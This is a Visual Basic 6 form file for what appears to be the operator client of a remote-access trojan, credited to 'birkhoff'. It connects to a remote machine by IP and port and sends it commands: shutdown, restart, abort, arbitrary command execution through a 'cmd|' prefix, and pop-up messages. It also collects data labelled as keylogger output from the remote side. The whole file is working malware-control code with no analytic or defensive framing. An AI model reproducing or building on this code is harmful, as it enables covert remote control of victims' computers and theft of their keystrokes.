VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H80000002&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Client by birkhoff"
   ClientHeight    =   5235
   ClientLeft      =   4275
   ClientTop       =   2730
   ClientWidth     =   9120
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5235
   ScaleWidth      =   9120
   Begin VB.CommandButton Command8 
      BackColor       =   &H00FFFF00&
      Caption         =   "Enviar"
      Height          =   615
      Left            =   6240
      Style           =   1  'Graphical
      TabIndex        =   13
      Top             =   4200
      Width           =   1455
   End
   Begin VB.TextBox Text4 
      Height          =   2415
      Left            =   5160
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   12
      Text            =   "clieent.frx":0000
      Top             =   1560
      Width           =   3735
   End
   Begin VB.TextBox Text3 
      Height          =   495
      Left            =   360
      TabIndex        =   11
      Top             =   3720
      Width           =   3495
   End
   Begin VB.CommandButton Command7 
      BackColor       =   &H00FFFF00&
      Caption         =   "Ejecutar"
      Height          =   495
      Left            =   1440
      MaskColor       =   &H00FF0000&
      Style           =   1  'Graphical
      TabIndex        =   10
      Top             =   4440
      Width           =   1215
   End
   Begin VB.CommandButton Command6 
      BackColor       =   &H00FFFF00&
      Caption         =   "Reiniciar"
      Height          =   495
      Left            =   2160
      Style           =   1  'Graphical
      TabIndex        =   9
      Top             =   2520
      Width           =   1455
   End
   Begin VB.CommandButton Command5 
      BackColor       =   &H00FFFF00&
      Caption         =   "Abort"
      Height          =   495
      Left            =   2160
      Style           =   1  'Graphical
      TabIndex        =   8
      Top             =   1800
      Width           =   1455
   End
   Begin VB.CommandButton Command4 
      BackColor       =   &H00FFFF00&
      Caption         =   "Shutdown"
      Height          =   495
      Left            =   480
      Style           =   1  'Graphical
      TabIndex        =   7
      Top             =   2520
      Width           =   1455
   End
   Begin VB.CommandButton Command3 
      BackColor       =   &H00FFFF00&
      Caption         =   "Keylogger"
      Height          =   495
      Left            =   480
      Style           =   1  'Graphical
      TabIndex        =   6
      Top             =   1800
      Width           =   1455
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Disconnect"
      BeginProperty Font 
         Name            =   "Segoe Print"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2880
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   840
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      BeginProperty Font 
         Name            =   "Segoe Print"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   600
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   840
      Width           =   1455
   End
   Begin VB.TextBox Text2 
      Height          =   375
      Left            =   4920
      TabIndex        =   1
      Text            =   "1000"
      Top             =   240
      Width           =   1935
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   1080
      TabIndex        =   0
      Text            =   "127.0.0.1"
      Top             =   240
      Width           =   1935
   End
   Begin VB.PictureBox sock1 
      Height          =   480
      Left            =   8040
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   15
      Top             =   4320
      Width           =   1200
   End
   Begin VB.Label Label3 
      BackColor       =   &H80000002&
      Caption         =   "This program is designed and developed by Birkhoff (M.J)"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   1335
      Left            =   7200
      TabIndex        =   14
      Top             =   0
      Width           =   1935
   End
   Begin VB.Line Line4 
      X1              =   7080
      X2              =   7080
      Y1              =   0
      Y2              =   1440
   End
   Begin VB.Line Line3 
      X1              =   0
      X2              =   4320
      Y1              =   3360
      Y2              =   3360
   End
   Begin VB.Line Line2 
      X1              =   4320
      X2              =   4320
      Y1              =   1440
      Y2              =   5400
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   9480
      Y1              =   1440
      Y2              =   1440
   End
   Begin VB.Label Label2 
      BackColor       =   &H80000002&
      Caption         =   "PUERTO -->"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3240
      TabIndex        =   3
      Top             =   240
      Width           =   1815
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000002&
      Caption         =   "IP -->"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   240
      TabIndex        =   2
      Top             =   240
      Width           =   735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()
sock1.Close
sock1.Connect Text1.Text, 1000
End Sub

Private Sub Command2_Click()
Dim intresponse As Integer
intresponse = MsgBox("¿Estas seguro que deseas desconectarte?", _
vbYesNo + vbQuestion, _
"By birkhoff")
If intresponse = vbYes Then
sock1.Close
Form1.Caption = "Not connected"
End If



End Sub

Private Sub Command3_Click()
Form2.Show
End Sub

Private Sub Command4_Click()
sock1.SendData "shutdown"
End Sub

Private Sub Command5_Click()
sock1.SendData "abort"
End Sub

Private Sub Command6_Click()
sock1.SendData "reiniciar"
End Sub

Private Sub Command7_Click()
sock1.SendData "cmd|" & Text3.Text
End Sub

Private Sub Command8_Click()
sock1.SendData "message|" & Text4.Text
End Sub

Private Sub sock1_Connect()
Form1.Caption = "Connected"
End Sub

Private Sub sock1_DataArrival(ByVal bytesTotal As Long)
Dim keys As String
sock1.GetData keys, vbString
Form2.Text1.Text = Form2.Text1.Text & keys
End Sub

Private Sub sock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Form1.Caption = "Connection Error"
End Sub
